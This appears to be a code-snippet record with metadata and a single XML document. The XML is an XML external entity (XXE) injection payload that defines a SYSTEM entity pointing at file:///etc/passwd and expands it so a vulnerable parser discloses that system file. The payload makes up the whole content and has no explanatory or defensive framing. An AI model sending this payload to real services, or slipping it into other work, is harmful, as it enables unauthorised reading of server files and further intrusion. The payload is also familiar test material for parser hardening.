---
id: a66c53f3-1594-4415-a245-62b74aeb33d7
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.133960+00:00'
updated_at: '2023-04-10T20:24:39.189886+00:00'
---

# Code Snippet a66c53f3

**Language**: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```


